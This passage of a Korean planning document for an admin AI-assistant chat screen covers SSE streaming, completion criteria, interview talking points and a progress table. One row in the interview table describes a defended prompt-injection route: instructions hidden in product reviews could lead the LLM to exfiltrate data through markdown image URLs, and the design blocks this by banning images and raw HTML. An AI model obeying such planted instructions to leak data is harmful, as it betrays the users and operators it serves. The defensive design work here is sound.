- **데모 관리자도 어시스턴트를 쓴다**(`DemoAccountGuard` 없음) — 추천 칩으로 사용량이 늘 수 있다. 무료 티어 분당 15회 + 전역 Throttler 100/분이 상한. 이번 범위에서는 바꾸지 않고, 시연 전 쿼터만 확인.
- 문서 규칙: 운영 배포 뒤 CLAUDE.md §5 에 옮기기 전까지 루트 README 에는 적지 않는다(시연 가능 범위 원칙).

---

## 9. 완료 기준 (DoD)

1. 도구를 쓰는 질문에서 도구 이름별 진행 표시가 나타나고, 답변의 표·목록이 렌더링된다. LLM 출력의 HTML·마크다운 이미지가 실행·로드되지 않는다(mock 응답 + Network 탭으로 확인).
2. 중지하면 서버도 다음 라운드를 열지 않고(로컬 로그), 새로고침 후 복원 내용이 중지 시점 화면과 같다.
3. 토큰을 망가뜨린 상태에서 전송해도 자동 갱신 후 응답이 온다. 한글 조합 중 Enter 가 오작동하지 않는다.
4. `/admin/assistant` axe 위반 0 · 키보드만으로 전송/중지/재입력 완주 · NVDA 가 상태와 완성 본문을 읽는다.
5. 테스트: 프론트 파서·훅 단위 + 백엔드 `assistant.service.spec.ts` 통과, ops 단위 무회귀, 양쪽 tsc.
6. §5 before/after 표가 실측값으로 채워져 있다(구매자 라우트 번들 불변 포함).

---

## 10. 면접 설명 포인트 (질문 → 답의 근거 위치)

| 예상 질문 | 답의 요지 | 코드 |
|---|---|---|
| SSE 와 WebSocket 차이? 왜 SSE? | 서버 → 클라이언트 단방향 텍스트 흐름이면 SSE 가 평범한 HTTP 응답이라 프록시·인증이 단순(nginx 는 버퍼링만 끄면 됨 — `X-Accel-Buffering: no`). 양방향 실시간이 필요할 때 WebSocket. 단, fetch 로 읽는 SSE 는 EventSource 의 **자동 재연결이 없다** — 이 화면은 재연결 대신 오류 표시를 택했다 | `assistant.controller.ts` 헤더 4줄 |
| EventSource 를 왜 안 썼나? | GET 전용 · 커스텀 헤더 불가 → Bearer 토큰과 POST body 를 못 보냄. fetch 스트림으로 SSE 형식만 빌려 씀 | `admin-assistant.ts` 주석 + `parseSseChunk` |
| 청크가 프레임 중간에서 잘리면? | 버퍼에 쌓고 `\n\n` 단위로만 자른 뒤 나머지를 다음 청크로 넘김 — 테스트 케이스로 고정 | 파서 단위 테스트 |
| 스트리밍 텍스트를 스크린리더에 어떻게? | 델타마다 live region 을 갱신하면 조각 읽기 → 상태는 `role=status`, 본문은 완성 후 1회 | D7 · NVDA 기록 |
| 마크다운 렌더링 시 보안? | LLM 출력은 외부 입력 — HTML 문자열로 꽂지 않고 React 요소로, 원시 HTML 무시. 그리고 **이미지 금지**: 리뷰 속 프롬프트 인젝션이 이미지 주소로 데이터를 빼낼 수 있다(CSP 가 https 이미지를 허용) | D2 · mock 응답 + Network 탭 |
| 델타가 초당 수십 개면 성능? | rAF 배칭 + 완성 메시지 memo → 재파싱은 마지막 메시지만, 프레임당 1회 | D3 · Performance 기록 |
| 중지 버튼이 정말 멈추나? | 처음엔 UI 만 멈췄다(측정으로 발견) → 연결 끊김을 서버까지 전파, 단 이미 나간 LLM 요청은 과금된다는 한계까지 | D5 · §5 측정 |
| 토큰 만료는? | 스트림 시작 전 401 만 처리(인증은 시작 시 1회 검사), 기존 refresh 함수 재사용으로 "동시 refresh 1회" 규칙 공유 | D4 |

---

## 11. 진행표 (구현하며 채운다)

| 단계 | 상태 | 비고 |
|---|---|---|
| ① 수정 전 측정 | ✅ | §5-2(2026-10-03~04). G4 재현됨 · G5 재현 안 됨(예방적 수정) · NVDA before 는 청취만 하고 내용 미기록 |
| ② 구조 분해 | ✅ | `parseSseChunk`(+단위 9건, 깨진 JSON 건너뛰기 포함 — G9) · `useAssistantStream` · `MessageList`/`MessageBubble`/`Composer`/`EmptyState` · 이 화면의 `style={{}}` 0곳. **화면 불변 확인**: 수정 전/후 스크린샷 4장(데스크톱·모바일 × 빈 화면·복원)이 바이트 단위로 동일(`scripts/ai-chat/screenshot.mjs`), 프로브 3종 결과도 before 와 같음(401 그대로 · 중지 후 서버 2라운드 그대로 · 포커스 `body`). 번들 3.17 → 3.27 kB / First Load 226 → 227 kB. tsc · eslint 통과 |
| ③ 입력·인증 결함 | ⬜ | |
| ④ 백엔드 B-1·B-2 | ⬜ | |
| ⑤ 도구 진행 표시 + 칩 | ⬜ | |
| ⑥ 마크다운 + 배칭 | ⬜ | |
| ⑦ 스크롤·스크린리더 | ⬜ | |
| ⑧ 수정 후 측정 + 문서 | ⬜ | |
